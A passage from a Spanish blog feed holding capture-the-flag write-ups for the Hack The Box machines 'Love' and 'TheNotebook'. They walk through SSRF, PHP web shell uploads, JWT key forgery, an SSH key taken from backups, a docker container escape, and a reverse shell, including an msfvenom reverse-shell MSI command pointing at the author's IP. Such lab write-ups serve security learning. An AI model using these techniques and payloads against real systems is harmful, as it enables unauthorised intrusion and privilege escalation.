subdominio y 3 puertos que corren una página web, a ver qué será eso. Agregamos love.htb y staging.love.htb al /etc/hosts y entramos a Faaaaaairfox a ver qué es qué.Si entramos a love.htb nos encontramos un panel de inicio de sesión con el que no vamos a hacer nada de momento, así que vamos a mirar los demás puertos.Entramos a staging.love.htb(o https://10.10.10.239) y nos encontramos esto, que tiene mejor pinta, volveremos tras ver que hay en el puerto 5000.:/Pues vamos a volver al HTTPS.Si le damos al apartado de demo nos lleva a esto, que nos pide una URL, pero qué pasa si le ponemos el puerto 5000, que desde fuera esta prohibido? No hay que escribir la IP de la máquina, si no localhost, ya que estamos pidiendo algo de la misma máquina.BUENOOOOOOOOOOOO, unas credenciales. Creo que todos sabemos para qué es esto, así que volvamos a love.htb(Puerto 80), y como dice admin tiene que haber un /admin.Efectivamente, estamos dentro.Buscando por la dashboard no encontramos nada de utilidad, pero podemos cambiar la foto de perfil de nuestro usuario, y ¿qué pasaría si en vez de un .jpg le metemos una shell en PHP como esta?Pues que nos deja sin problema.Entonces vamos a /images/rce.php(el nombre de mi archivo) y con el parámetro cmd le pasamos un comando a nivel de sistema:Yyyy ahí está :D. Verifiqué si tenía cURL y en efecto, lo tenía, así que lo aproveché para colar un nc.exe y entablarme una reverse shell.La máquina ha hecho una petición GET a mi máquina solicitando nc.exe, y con -o lo he guardado a nc.exe, ahora solo falta ejecutarlo y enviarme una shell. Usando el nc que pasé antes me he enviado un cmd.exe con el parámetro -e a mi IP por el puerto 6969(nice.)Bueno, somos phoebe, si vemos qué privilegios tenemos con whoami /priv tenemos:Pero, ¿y si vemos el registro a ver si tenemos AlwaysInstallElevated?reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\InstallerHKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer    AlwaysInstallElevated    REG_DWORD    0x1Está puesto en 1, que significa True, así que podemos generar un binario malicioso que envíe una shell a mi máquina como root con msfvenom.❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.137 LPORT=42069 -f msi -o reverse.msi[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 460 bytesFinal size of msi file: 159744 bytesSaved as: reverse.msiAhora solo faltaría crear un servidor HTTP con python, descargarlo en la máquina y escuchar con netcat.Ahí recibimos la petición GET, ahora hay que ejecutarlo escribiendo el nombre del archivo y escuchar con nc por el puerto que hayas introducido en LPORT al crear el payload.Ahí estáaaaaa, ahora hay que dirigirse a C:\\Users\\Administrator\\Desktop y leer root.txt con type root.txt.Ha sido una máquina bastante divertida, me ha gustado bastante la parte del user, pero no tanto la privesc. Hasta aquí la máquina, el siguiente sábado haré otro writeup(si soy capaz de hacer la máquina :p)Y recuerda, aguante Metasploit ;)",
            "content_html": "<p>Love es una máquina Windows de nivel fácil en la que tendremos que explotar un SSRF para conseguir credenciales para iniciar sesión como administrador, subir una shell en PHPe instalar un binario para ser NT AUTHORITY\\SYSTEM.</p><p>Como siempre, empezamos escaneando puertos para saber por donde ir para atacar:</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code># Nmap 7.91 scan initiated Fri Aug  6 11:59:13 2021 as: nmap -p- --open -sS --min-rate 5000 -n -v -Pn -oG ports -oN ports.nmap 10.10.10.239Nmap scan report for 10.10.10.239Host is up (0.16s latency).Not shown: 54285 closed ports, 11231 filtered portsSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT      STATE SERVICE80/tcp    open  http135/tcp   open  msrpc139/tcp   open  netbios-ssn443/tcp   open  https445/tcp   open  microsoft-ds3306/tcp  open  mysql5000/tcp  open  upnp5040/tcp  open  unknown5985/tcp  open  wsman5986/tcp  open  wsmans7680/tcp  open  pando-pub47001/tcp open  winrm49664/tcp open  unknown49665/tcp open  unknown49666/tcp open  unknown49667/tcp open  unknown49668/tcp open  unknown49669/tcp open  unknown49670/tcp open  unknownRead data files from: /usr/bin/../share/nmap# Nmap done at Fri Aug  6 12:00:05 2021 -- 1 IP address (1 host up) scanned in 52.20 seconds</code></pre></div></div><table>    <tr>        <td>Puerto</td>        <td>    Servicio</td>    </tr>    <tr>        <td>80</td>        <td>HTTP - aloja una página web  </td>    </tr>    <tr>        <td>135</td>        <td>msrpc - nos podríamos conectar con rpcclient para enumerar usuarios</td>    </tr>    <tr>        <td>443</td>        <td>HTTPS - como HTTP pero más seguro</td>    </tr>    <tr>        <td>445</td>        <td>SMB - para acceder a recursos compartidos del sistema con smbclient</td>    </tr>    <tr>        <td>3306</td>        <td>MySQL - una base de datos en la que pueden haber contraseñas </td>    </tr>    <tr>        <td>47001</td>        <td>WinRM - sirve para administrar el sistema de forma remota, nos podríamos conectar con evil-winRM con credenciales válidas</td>    </tr></table><p>He decidido no poner el resto de puertos ya que no vamos a hacer nada con ellos ni he encontrado una explicación que me guste, y no me gusta extenderme de más.</p><p>Tras ver qué puertos están abiertos hacemos un escaneo exhaustivo de estos con -sC y -sV para ver la versión y servicio que corren y usar unos scripts básicos de enumeración:</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code># Nmap 7.91 scan initiated Fri Aug  6 12:01:14 2021 as: nmap -sC -sV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -oN targeted 10.10.10.239Nmap scan report for 10.10.10.239Host is up (0.36s latency).PORT      STATE SERVICE      VERSION80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)135/tcp   open  msrpc        Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in| Not valid before: 2021-01-18T14:00:16|_Not valid after:  2022-01-18T14:00:16|_ssl-date: TLS randomness does not represent time| tls-alpn: |_  http/1.1445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)3306/tcp  open  mysql?| fingerprint-strings: |   LDAPBindReq, LPDString, TLSSessionReq, afp: |_    Host '10.10.14.137' is not allowed to connect to this MariaDB server5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden5040/tcp  open  unknown5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found| ssl-cert: Subject: commonName=LOVE| Subject Alternative Name: DNS:LOVE, DNS:Love| Not valid before: 2021-04-11T14:39:19|_Not valid after:  2024-04-10T14:39:19|_ssl-date: 2021-08-06T16:25:59+00:00; +21m35s from scanner time.| tls-alpn: |_  http/1.17680/tcp  open  pando-pub?47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open  msrpc        Microsoft Windows RPC49665/tcp open  msrpc        Microsoft Windows RPC49666/tcp open  msrpc        Microsoft Windows RPC49667/tcp open  msrpc        Microsoft Windows RPC49668/tcp open  msrpc        Microsoft Windows RPC49669/tcp open  msrpc        Microsoft Windows RPC49670/tcp open  msrpc        Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.91%I=7%D=8/6%Time=610D5CDC%P=x86_64-pc-linux-gnu%r(TLSSF:SessionReq,4B,\"G\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.137'\\x20is\\x20notSF:\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(LPDSF:String,4B,\"G\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.137'\\x20is\\x20not\\x20SF:allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(LDAPBinSF:dReq,4B,\"G\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.137'\\x20is\\x20not\\x20alSF:lowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(afp,4B,\"GSF:\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.137'\\x20is\\x20not\\x20allowed\\x20tSF:o\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\");Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h06m36s, deviation: 3h30m03s, median: 21m34s| smb-os-discovery: |   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)|   OS CPE: cpe:/o:microsoft:windows_10::-|   Computer name: Love|   NetBIOS computer name: LOVE\\x00|   Workgroup: WORKGROUP\\x00|_  System time: 2021-08-06T09:25:41-07:00| smb-security-mode: |   account_used: &lt;blank&gt;|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2021-08-06T16:25:48|_  start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Aug  6 12:04:27 2021 -- 1 IP address (1 host up) scanned in 192.89 seconds</code></pre></div></div><p>Haciendo un escaneo de la versión y el servicio que corre cada uno de estos puertos nos encontramos un subdominio y 3 puertos que corren una página web, a ver qué será eso. Agregamos <code class=\"language-plaintext highlighter-rouge\">love.htb</code> y <code class=\"language-plaintext highlighter-rouge\">staging.love.htb</code> al /etc/hosts y entramos a Faaaaaairfox a ver qué es qué.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/128548460-fa9a5463-ef23-4664-973a-2fdc26ea24df.png\" alt=\"imagen\" /></p><p>Si entramos a love.htb nos encontramos un panel de inicio de sesión con el que no vamos a hacer nada de momento, así que vamos a mirar los demás puertos.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/128548619-8c838255-39d3-46b3-b294-5f68bbdf0475.png\" alt=\"imagen\" /></p><p>Entramos a staging.love.htb(o https://10.10.10.239) y nos encontramos esto, que tiene mejor pinta, volveremos tras ver que hay en el puerto 5000.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/128548702-59561f22-9593-410c-a901-c2e72080ea82.png\" alt=\"imagen\" /></p><p>:/Pues vamos a volver al HTTPS.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/128548855-9ecd1cac-334a-4b9a-9c21-f002e3a73736.png\" alt=\"imagen\" /></p><p>Si le damos al apartado de demo nos lleva a esto, que nos pide una URL, pero qué pasa si le ponemos el puerto 5000, que desde fuera esta prohibido? No hay que escribir la IP de la máquina, si no localhost, ya que estamos pidiendo algo de la misma máquina.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/128549076-33a3b327-2a4d-41d2-b06c-48514ec1f542.png\" alt=\"imagen\" /></p><p>BUENOOOOOOOOOOOO, unas credenciales. Creo que todos sabemos para qué es esto, así que volvamos a love.htb(Puerto 80), y como dice admin tiene que haber un /admin.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/128571884-33d1f0b2-bb42-4c47-a2da-ca7a0bee2ee9.png\" alt=\"imagen\" /></p><p>Efectivamente, estamos dentro.Buscando por la dashboard no encontramos nada de utilidad, pero podemos cambiar la foto de perfil de nuestro usuario, y ¿qué pasaría si en vez de un .jpg le metemos una shell en PHP como esta?</p><p><img src=\"https://user-images.githubusercontent.com/71317374/128572164-71d6556d-8e70-491a-9ef0-d8fd0bfd48ea.png\" alt=\"imagen\" /></p><p>Pues que nos deja sin problema.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/128572281-beb15c21-fd8f-476b-9988-a99c60246a90.png\" alt=\"imagen\" /></p><p>Entonces vamos a /images/rce.php(el nombre de mi archivo) y con el parámetro cmd le pasamos un comando a nivel de sistema:</p><p><img src=\"https://user-images.githubusercontent.com/71317374/128572413-ecc9ac31-9ca9-48c1-8935-ea0e893bec9d.png\" alt=\"imagen\" /></p><p>Yyyy ahí está :D. Verifiqué si tenía cURL y en efecto, lo tenía, así que lo aproveché para colar un nc.exe y entablarme una reverse shell.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/128572646-f3e83e62-b746-44f5-9bc4-826382b6174c.png\" alt=\"imagen\" /></p><p>La máquina ha hecho una petición GET a mi máquina solicitando nc.exe, y con -o lo he guardado a nc.exe, ahora solo falta ejecutarlo y enviarme una shell. Usando el nc que pasé antes me he enviado un cmd.exe con el parámetro -e a mi IP por el puerto 6969(nice.)</p><p><img src=\"https://user-images.githubusercontent.com/71317374/128572897-f219c461-8633-4b3c-83fd-ea2f55e82ff1.png\" alt=\"imagen\" /></p><p>Bueno, somos phoebe, si vemos qué privilegios tenemos con <code class=\"language-plaintext highlighter-rouge\">whoami /priv</code> tenemos:</p><p><img src=\"https://user-images.githubusercontent.com/71317374/128575730-5b80b53e-6180-46f6-94e3-f441a7795782.png\" alt=\"imagen\" /></p><p>Pero, ¿y si vemos el registro a ver si tenemos AlwaysInstallElevated?</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\InstallerHKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer    AlwaysInstallElevated    REG_DWORD    0x1</code></pre></div></div><p>Está puesto en 1, que significa True, así que podemos generar un binario malicioso que envíe una shell a mi máquina como root con <code class=\"language-plaintext highlighter-rouge\">msfvenom</code>.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.137 LPORT=42069 -f msi -o reverse.msi[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 460 bytesFinal size of msi file: 159744 bytesSaved as: reverse.msi</code></pre></div></div><p>Ahora solo faltaría crear un servidor HTTP con python, descargarlo en la máquina y escuchar con netcat.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/128576105-95b02d26-f3d1-4c3a-95d6-77064eff3e96.png\" alt=\"imagen\" /></p><p>Ahí recibimos la petición GET, ahora hay que ejecutarlo escribiendo el nombre del archivo y escuchar con nc por el puerto que hayas introducido en LPORT al crear el payload.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/128576255-2cae797b-fb8b-4498-9e8c-dc5e1a843907.png\" alt=\"imagen\" /></p><p>Ahí estáaaaaa, ahora hay que dirigirse a C:\\Users\\Administrator\\Desktop y leer root.txt con <code class=\"language-plaintext highlighter-rouge\">type root.txt</code>.</p><p>Ha sido una máquina bastante divertida, me ha gustado bastante la parte del user, pero no tanto la privesc. Hasta aquí la máquina, el siguiente sábado haré otro writeup(si soy capaz de hacer la máquina :p)</p><p>Y recuerda, aguante Metasploit ;)</p>",
            "url": "https://binlaab.github.io/2021/08/07/love",
            
            
            
            
            
            "date_published": "2021-08-07T00:00:00+00:00",
            "date_modified": "2021-08-07T00:00:00+00:00",
            
                "author":  {
                "name": "p0wex",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://binlaab.github.io/2021/07/31/the-notebook",
            "title": The Notebook,
            "summary": null,
            "content_text": "Bueno, este es el primer post, voy a intentar no dejar morir la página.TheNotebook es una Máquina Linux de nivel medio en la que tendremos que cambiar nuestra cookie de sesión a la del todopoderoso admin para conseguir una shell como www-data, robarle la ID a Noah y escapar del contenedor para convertirnos en root.Como siempre, comenzamos escaneando los puertos de la máquina para saber a qué nos enfrentamos. Yo suelo hacer directamente un escaneo de la versión y servicio de los puertos abiertos.&gt; nmap -p- --open --min-rate 3000 -sS -sC -sV 10.10.10.230 -oN targetedNmap 7.91 scan initiated Sat Jul 17 13:53:17 2021 as: nmap -p- --open --min-rate 3000 -sS -sC -sV 10.10.10.230 -oN targetedNmap scan report for 10.10.10.230Host is up (0.047s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)80/tcp open  http    nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: The Notebook - Your Note KeeperService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done at Sat Jul 17 13:53:27 2021 -- 1 IP address (1 host up) scanned in 9.49 secondsBueno, puertos 22(SSH, nada por ahí) y 80(HTTP)En el HTTP encontramos una página web con un panel de inicio de sesión y registro. Fuzzearla no hace nada :/, así que nos registramos y creamos una nueva nota, pero antes abriendo burpsuite para ver como viajan los datos, y descubrimos una cookie de sesión, en concreto una JWT(Json Web Token)Buscando más sobre esto nos encontramos una página en la que podemos encriptar y desencriptar estas cookies, si desencripto la mía aparece: Veo 2 cosas interesantes: el parámetro ‘kid’ y ‘admin_cap’. El parámetro kid(Key ID), que indica qué clave se ha usado para asegurar ese JWT, busca una clave privada en su puerto 7070, pero podríamos cambiarlo a mi IP de atacante para que verifique el token con mi clave privada. Para generar una clave JWT RS256 (que es el algoritmo que usa esta página web) hay que hacerlo con ssh-keygen&gt; ssh-keygen -t rsa -b 4096 -m PEM -f privKey.keyEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in privKey.keyYour public key has been saved in privKey.key.pubThe key fingerprint is:SHA256:0TXya6jN+ppi3B2PetAK53kFWu70pb5w74Yr+5WQAC8 root@kaliThe key's randomart image is:+---[RSA 4096]----+|        . . o    ||         + + .   ||        E + .    ||         ooo o   ||        S=..=    ||      . ++=..... ||     . =.B+*.+o  ||      + =oBo=o.  ||     . .=*o===o  |+----[SHA256]-----+Ahora que tengo la clave, la idea sería copiarla al portapapeles para crear mi JWT con permisos de admin y además compartir un servidor HTTP con python para que compruebe que la clave existe.Metemos la clave en Storage y… tenemos acceso al panel de administrador!!!Si vamos al Admin Panel tenemos 2 apartados, uno para ver notas y otro para subir archivos. En las notas hay 2 muy interesantes: Buenooooo, podemos subir archivos PHP con una reverse shell o una backdoor, y además hay backups de algo, lo que es interesante. Vamos a subir una shell en PHP para ejecutar comandos, por qué no?Visitamos esa URL y mediante el parámetro cmd le especificamos comandos a ejecutar:Y… somos el usuario www-data, y ahora que tenemos ejecución de comandos vamos a entablarnos una Reverse Shell.._. Nos han borrado el archivo, así que toca subirlo de nuevo. Estuve un rato probando y no funcionaban los comandos para enviar shells, así que opté por una reverse shell normal, la de PentestMonkeyY ahí está, soy www-data, así que procedo a hacer un tratamiento de la TTY para no hacer ctrl + c y quedarme sin shell(me ha pasado).Recordando la nota de las backups, voy a investigar por ahí, a ver si encuentro algo. Se suelen guardar en /var/backups, y esta máquina no es menos, las backups están ahí. Me las he movido a /dev/shm para trabajar con ellas.Ojooooo, tenemos acceso a /home/noah en forma de backup, si listamos los contenidos con ls -la hay un directorio .ssh, y todos sabemos qué significa eso, una id_rsa para entrar como noah.Me la copio a mi máquina y me autentico como él por SSH para leer la user flag:ez.Tras entrar a cualquier máquina linux hago sudo -l a ver si pudiera ejecutar como root algún comando, en este caso ¿docker?bash-4.4$ sudo -lMatching Defaults entries for noah on thenotebook:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser noah may run the following commands on thenotebook:    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*Vamos a buscar la versión a ver si hubiera algún exploit para esa versión:-bash-4.4$ docker --versionDocker version 18.06.0-ce, build 0ffa825Yyyyy justo hay dos de Container Breakout, escapar del contenedor, qué casualidad, no? Ni hecho a posta xD.https://github.com/Frichetten/CVE-2019-5736-PoC Yo usé este, que es el primero que me encontré :pCambiamos el comando a ejecutar en main.go para darle permiso SUID a la /bin/bash y así entrar como noah por SSH para ejecutar bash -p y conseguir ser root y construimos la aplicación para que pueda correr en la máquina con go build \"ldflags -s -w\" . para reducir el peso del archivo y abrimos un servidor HTTP con python para que descargue el ejecutable.Ya está en la máquina, ahora solo falta correr el ejecutable y seremos el todopoderoso root.Y finalmente, máquina rooteada. Me ha gustado bastante la escalada de privilegios, pero no tanto el user, me ha parecido algo simple, pero la máquina en general bien.Y recuerda, aguante Metasploit",
            "content_html": "<p>Bueno, este es el primer post, voy a intentar no dejar morir la página.</p><p>TheNotebook es una Máquina Linux de nivel medio en la que tendremos que cambiar nuestra cookie de sesión a la del todopoderoso admin para conseguir una shell como www-data, robarle la ID a Noah y escapar del contenedor para convertirnos en root.</p><p>Como siempre, comenzamos escaneando los puertos de la máquina para saber a qué nos enfrentamos. Yo suelo hacer directamente un escaneo de la versión y servicio de los puertos abiertos.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>&gt; nmap -p- --open --min-rate 3000 -sS -sC -sV 10.10.10.230 -oN targeted</code></pre></div></div><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>Nmap 7.91 scan initiated Sat Jul 17 13:53:17 2021 as: nmap -p- --open --min-rate 3000 -sS -sC -sV 10.10.10.230 -oN targetedNmap scan report for 10.10.10.230Host is up (0.047s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)80/tcp open  http    nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: The Notebook - Your Note KeeperService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done at Sat Jul 17 13:53:27 2021 -- 1 IP address (1 host up) scanned in 9.49 seconds</code></pre></div></div><p>Bueno, puertos 22(SSH, nada por ahí) y 80(HTTP)</p><p>En el HTTP encontramos una página web con un panel de inicio de sesión y registro. <img src=\"https://user-images.githubusercontent.com/71317374/127770899-030fac83-8883-4f42-8e80-7f723f3a5dc1.png\" alt=\"web\" /></p><p>Fuzzearla no hace nada :/, así que nos registramos y creamos una nueva nota, pero antes abriendo burpsuite para ver como viajan los datos, y descubrimos una cookie de sesión, en concreto una JWT(Json Web Token)<img src=\"https://user-images.githubusercontent.com/71317374/127771086-62b6d643-4f76-4fc6-b27d-213679667cad.jpg\" alt=\"Cookie de usuario\" /></p><p>Buscando más sobre esto nos encontramos una página en la que podemos encriptar y desencriptar estas cookies, si desencripto la mía aparece: <img src=\"https://user-images.githubusercontent.com/71317374/127771204-cbe65c3e-e81a-441c-a420-59c03db8e181.jpg\" alt=\"PrtScr capture_2\" /></p><p>Veo 2 cosas interesantes: el parámetro ‘kid’ y ‘admin_cap’. El parámetro kid(Key ID), que indica qué clave se ha usado para asegurar ese JWT, busca una clave privada en su puerto 7070, pero podríamos cambiarlo a mi IP de atacante para que verifique el token con mi clave privada. Para generar una clave JWT RS256 (que es el algoritmo que usa esta página web) hay que hacerlo con ssh-keygen</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>&gt; ssh-keygen -t rsa -b 4096 -m PEM -f privKey.keyEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in privKey.keyYour public key has been saved in privKey.key.pubThe key fingerprint is:SHA256:0TXya6jN+ppi3B2PetAK53kFWu70pb5w74Yr+5WQAC8 root@kaliThe key's randomart image is:+---[RSA 4096]----+|        . . o    ||         + + .   ||        E + .    ||         ooo o   ||        S=..=    ||      . ++=..... ||     . =.B+*.+o  ||      + =oBo=o.  ||     . .=*o===o  |+----[SHA256]-----+</code></pre></div></div><p>Ahora que tengo la clave, la idea sería copiarla al portapapeles para crear mi JWT con permisos de admin y además compartir un servidor HTTP con python para que compruebe que la clave existe.<img src=\"https://user-images.githubusercontent.com/71317374/127781126-6f3aaf2b-f8ee-4413-8626-b81597469d15.png\" alt=\"Generando el JWT\" /></p><p>Metemos la clave en Storage y… tenemos acceso al panel de administrador!!!<img src=\"https://user-images.githubusercontent.com/71317374/127781194-9169d3d4-ba62-408f-abe7-7747958c52e3.png\" alt=\"permisos de admin\" /></p><p>Si vamos al Admin Panel tenemos 2 apartados, uno para ver notas y otro para subir archivos. En las notas hay 2 muy interesantes: <img src=\"https://user-images.githubusercontent.com/71317374/127781227-14318fa7-54ae-4cf7-ac83-901ba2973f03.png\" alt=\"Nota 1\" /><img src=\"https://user-images.githubusercontent.com/71317374/127781240-ff0496a6-9150-4202-ac2c-f683cee0fe3e.png\" alt=\"Nota 2\" /></p><p>Buenooooo, podemos subir archivos PHP con una reverse shell o una backdoor, y además hay backups de algo, lo que es interesante. Vamos a subir una shell en PHP para ejecutar comandos, por qué no?<img src=\"https://user-images.githubusercontent.com/71317374/127781288-7c1232ac-07c9-4a57-81a4-27335ba31b12.png\" alt=\"subida de archivo PHP\" />Visitamos esa URL y mediante el parámetro cmd le especificamos comandos a ejecutar:<img src=\"https://user-images.githubusercontent.com/71317374/127781309-e0038a75-a5cf-4c63-8582-50f2aa77f389.png\" alt=\"whoami\" /></p><p>Y… somos el usuario www-data, y ahora que tenemos ejecución de comandos vamos a entablarnos una Reverse Shell.<img src=\"https://user-images.githubusercontent.com/71317374/127781347-ae4d05e2-046a-4786-a528-a0de8fa8d086.png\" alt=\"._.\" /></p><p>._. Nos han borrado el archivo, así que toca subirlo de nuevo. Estuve un rato probando y no funcionaban los comandos para enviar shells, así que opté por una reverse shell normal, la de PentestMonkey</p><p><img src=\"https://user-images.githubusercontent.com/71317374/127781758-eb00cd59-ae32-4934-8070-88a7f952b00c.png\" alt=\"shell\" /></p><p>Y ahí está, soy www-data, así que procedo a hacer un tratamiento de la TTY para no hacer ctrl + c y quedarme sin shell(me ha pasado).Recordando la nota de las backups, voy a investigar por ahí, a ver si encuentro algo. Se suelen guardar en /var/backups, y esta máquina no es menos, las backups están ahí. Me las he movido a /dev/shm para trabajar con ellas.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/127781901-814953b0-c657-4f65-b3fb-43194e9c5e88.png\" alt=\"backups\" /></p><p>Ojooooo, tenemos acceso a /home/noah en forma de backup, si listamos los contenidos con ls -la hay un directorio .ssh, y todos sabemos qué significa eso, una id_rsa para entrar como noah.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/127781965-96f43667-6549-4395-887b-2352ffce10d5.png\" alt=\"id_rsa\" /></p><p>Me la copio a mi máquina y me autentico como él por SSH para leer la user flag:</p><p><img src=\"https://user-images.githubusercontent.com/71317374/127782047-86046035-d677-449b-acd1-6ea5b9c32bf2.png\" alt=\"imagen\" /></p><p>ez.Tras entrar a cualquier máquina linux hago sudo -l a ver si pudiera ejecutar como root algún comando, en este caso ¿docker?</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>bash-4.4$ sudo -lMatching Defaults entries for noah on thenotebook:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser noah may run the following commands on thenotebook:    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*</code></pre></div></div><p>Vamos a buscar la versión a ver si hubiera algún exploit para esa versión:</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>-bash-4.4$ docker --versionDocker version 18.06.0-ce, build 0ffa825</code></pre></div></div><p>Yyyyy justo hay dos de Container Breakout, escapar del contenedor, qué casualidad, no? Ni hecho a posta xD.https://github.com/Frichetten/CVE-2019-5736-PoC Yo usé este, que es el primero que me encontré :p</p><p>Cambiamos el comando a ejecutar en main.go para darle permiso SUID a la /bin/bash y así entrar como noah por SSH para ejecutar <code class=\"language-plaintext highlighter-rouge\">bash -p</code> y conseguir ser root y construimos la aplicación para que pueda correr en la máquina con <code class=\"language-plaintext highlighter-rouge\">go build \"ldflags -s -w\" .</code> para reducir el peso del archivo y abrimos un servidor HTTP con python para que descargue el ejecutable.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/127782389-0e0587a1-0ab7-4bc0-952e-6a9ab07580bc.png\" alt=\"imagen\" /></p><p>Ya está en la máquina, ahora solo falta correr el ejecutable y seremos el todopoderoso root.</p><p><img src=\"https://user-images.githubusercontent.com/71317374/127782819-7a208abf-3e82-4cd2-b8f3-272c4999e6c6.png\" alt=\"root\" /></p><p>Y finalmente, máquina rooteada. Me ha gustado bastante la escalada de privilegios, pero no tanto el user, me ha parecido algo simple, pero la máquina en 